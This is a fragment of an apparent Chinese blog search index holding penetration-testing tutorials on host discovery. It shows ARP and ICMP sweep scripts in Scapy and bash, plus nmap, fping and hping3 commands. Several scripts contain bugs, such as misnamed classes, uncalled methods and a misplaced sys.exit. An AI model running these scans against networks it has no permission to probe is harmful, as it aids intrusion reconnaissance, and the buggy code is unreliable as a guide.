<span class="comment"># 打开文件列表</span></span><br><span class="line">&gt;</span><br><span class="line">&gt;</span><br><span class="line">&gt; <span class="class"><span class="keyword">class</span> <span class="title">Mythread</span><span class="params">(threading.Thread)</span>:</span></span><br><span class="line">&gt;     <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">&gt;         threading.Thread.__init__(self)</span><br><span class="line">&gt;</span><br><span class="line">&gt;     <span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self)</span>:</span></span><br><span class="line">&gt;         <span class="keyword">global</span> lock</span><br><span class="line">&gt;         time.sleep(<span class="number">1</span>)</span><br><span class="line">&gt;         <span class="keyword">if</span> lock.acquire():</span><br><span class="line">&gt;             <span class="keyword">for</span> addr <span class="keyword">in</span> file:</span><br><span class="line">&gt;                 answer = sr1(ARP(pdst = addr.strip()),timeout = <span class="number">0.1</span>,</span><br><span class="line">&gt;                              verbose = <span class="number">0</span>)  <span class="comment"># verbose=0，不显示报错的具体信息,这里循环打开的是文件中的每一行IP地址</span></span><br><span class="line">&gt;                 <span class="keyword">if</span> answer == <span class="keyword">None</span>:</span><br><span class="line">&gt;                     <span class="keyword">pass</span></span><br><span class="line">&gt;                 <span class="keyword">else</span>:</span><br><span class="line">&gt;                     <span class="keyword">print</span> addr.strip()  <span class="comment"># 将报错信息打印出来</span></span><br><span class="line">&gt;</span><br><span class="line">&gt;</span><br><span class="line">&gt; <span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">&gt;     ThreadList = []</span><br><span class="line">&gt;     lock = threading.Lock()</span><br><span class="line">&gt;     <span class="keyword">for</span> addr <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">200</span>):</span><br><span class="line">&gt;         t = MyThread()</span><br><span class="line">&gt;         ThreadList.append(t)</span><br><span class="line">&gt;     <span class="keyword">for</span> t <span class="keyword">in</span> ThreadList:</span><br><span class="line">&gt;         t.start</span><br><span class="line">&gt;     <span class="keyword">for</span> t <span class="keyword">in</span> ThreadList:</span><br><span class="line">&gt;         t.join</span><br><span class="line">&gt;</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote>
</li>
</ol>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>安全</tag>
        <tag>parrot</tag>
        <tag>信息收集</tag>
      </tags>
  </entry>
  <entry>
    <title>主动信息收集——三层发现</title>
    <url>/2018/06/05/%E5%9F%BA%E4%BA%8ETCP-IP%E7%9A%84%E4%B8%89%E5%B1%82%E5%8F%91%E7%8E%B0.md/</url>
    <content><![CDATA[<ul>
<li>三层发现的优点<ul>
<li>可路由</li>
<li>速度快</li>
</ul>
</li>
<li>缺点<ul>
<li>速度比二层慢</li>
<li>经常被边界防火墙过滤(还有可能出现宕机状态）</li>
</ul>
</li>
<li>IP、ICMP、TCP协议</li>
</ul>
<ol>
<li><p>ping</p>
<ul>
<li><p>使用ping命令的时候如果可以接发包，使用的是数据包的type8，如果不可以使用的是type0</p>
</li>
<li><p>ping -192.168.0.102 -c 5         在这里linux和Windows的ping包有些不同，使用-c 可以指定发送多少个数据包</p>
</li>
<li><p>进行三层的发现除了进行icmp的探测之外还可以用路由追踪 <figure class="highlight plain"><figcaption><span>使用路由追踪命令可能会被边界路由拦截，但是路由追踪和ping有点不同，它先会将TTL值设置为1，在经过第一跳路由以后减一，这个时候就会发送数据包</span></figcaption><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">- 使用traceroute和ping -R命令有点不同，使用traceroute返回的是较近的网卡，而使用ping -R返回的是较远的网卡</span><br><span class="line"></span><br><span class="line">- ```ping 192.168.1.103 -c 1 | grep &quot;bytes from&quot; | cut -d &quot; &quot; -f 4 | cut -d &quot;:&quot; -f 1``` 这样使用管道就可以将存在的ip显示出来</span><br><span class="line"></span><br><span class="line">- 由于ping命令本身不支持一个网段的并发性扫描，所以通过脚本来实现，三层的发现简单bash脚本：</span><br><span class="line"></span><br><span class="line">  ```bash</span><br><span class="line">  #/bin/bash</span><br><span class="line">  if [ &quot;$#&quot; -ne 1 ]; then</span><br><span class="line">      echo &quot;Usage - ./ping.sh [interface]&quot;</span><br><span class="line">      echo &quot;Example - ./ping.sh 192.168.1.0&quot;</span><br><span class="line">      echo &quot;Example will perform an ICMP&quot;</span><br><span class="line">  exit</span><br><span class="line">  fi</span><br><span class="line">      prefix=$(echo $1 | cut -d &apos;.&apos; -f 1-3)</span><br><span class="line">      for addr in $(seq 1 254); do</span><br><span class="line">      ping -c 1 $prefix.$addr | grep &quot;bytes from&quot; | cut -d &quot; &quot; -f 4 | cut -d &quot;:&quot; -f 1 &gt;&gt; addr.txt</span><br><span class="line">  done</span><br></pre></td></tr></table></figure></p>
</li>
<li><p>除了使用bash调用ping命令之外，还可以使用scopy类似于二层发现时的脚本来进行主机发现，使用scopy的时候一定要设置超时，脚本如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line">logging.getLogger(<span class="string">"scapy.runtime"</span>).setLevel(logging.ERROR)</span><br><span class="line"><span class="keyword">from</span> scapy.all <span class="keyword">import</span> *</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> len(sys.argv) != <span class="number">2</span>:  </span><br><span class="line">    <span class="keyword">print</span> <span class="string">"Usage - ./pingr 0/24 ICMP"</span>  </span><br><span class="line">    <span class="keyword">print</span> <span class="string">"Example - ./pingr 192.168.0.103"</span>  </span><br><span class="line">    <span class="keyword">print</span> <span class="string">"Example will perform an ICMP scan of the 192.168.0.0/24 range"</span>  </span><br><span class="line">sys.exit()</span><br><span class="line">address = str(sys.argv[<span class="number">1</span>])</span><br><span class="line">prefix = address.split(<span class="string">'.'</span>)[<span class="number">0</span>] + <span class="string">'.'</span> + address.split(<span class="string">'.'</span>)[<span class="number">1</span>] + <span class="string">'.'</span> + address.split(<span class="string">'.'</span>)[<span class="number">2</span>] + <span class="string">'.'</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> addr <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">254</span>):</span><br><span class="line">    answer=sr1(IP(dst=prefix+str(addr))/ICMP(),timeout=<span class="number">0.1</span>,verbose=<span class="number">0</span>)     </span><br><span class="line">    <span class="keyword">if</span> answer == <span class="keyword">None</span>:       </span><br><span class="line">        <span class="keyword">pass</span>   </span><br><span class="line">    <span class="keyword">else</span>:   </span><br><span class="line">        <span class="keyword">print</span> prefix+str(addr)</span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
</ol>
<ul>
<li>使用脚本也可以调用已经存在的IP列表进行扫描，这样将脚本改为加载ip文件，然后调用扫描就可以了</li>
</ul>
<ol start="2">
<li><p>除了使用ping和traceroute之外还可以使用nmap进行三层的发现：</p>
<ul>
<li><figure class="highlight plain"><figcaption><span>192.168.1.103 -sn```  nmap 使用-sn的时候如果是在本网段的网络会发送arp包，如果不是在本网段会发送icmp的数据包，但由于nmap使用了大量不同的技术手段去探测目标，所以还会发送tcp的数据包。</span></figcaption><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">3. fping :比ping的命令强大一点</span><br><span class="line"></span><br><span class="line">   - ```fping 192.168.1.103 -c 10</span><br></pre></td></tr></table></figure>
</li>
<li><figure class="highlight plain"><figcaption><span>-g 192.168.1.1 192.168.1.103  -c 10``` fping 与ping命令不同的是将一个ip段进行扫描，也可以使用0/24扫描，只显示ip的话可以使用管道进行分割</span></figcaption><table><tr><td class="code"><pre><span class="line">   - ```fping -f iplist.txt``` 调用ip列表文件</span><br><span class="line"></span><br><span class="line">4. hping :</span><br><span class="line"></span><br><span class="line">   - 能发送几乎任意TCO/IP的数据包，在一定程度上可以进行压力测试</span><br><span class="line"></span><br><span class="line">   - 功能强大，但每次只能扫描一个目标</span><br><span class="line"></span><br><span class="line">   - ```hping3 192.168.1.103 --icmp -c 2``` 也可以进行三层扫描</span><br><span class="line"></span><br><span class="line">   - 也可以使用一行的方式实现一个ip段的扫描，因为显示的内容太多，所以将扫描结果保存到一个TXT文件中</span><br><span class="line"></span><br><span class="line">      ```for addr in $(seq 1 254);do hping3 192.168.1.$addr --icmp -c 1 &gt;&gt; hping.txt &amp; done</span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
</ol>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>安全</tag>
        <tag>parrot</tag>
        <tag>信息收集</tag>
      </tags>
  </entry>
</search>
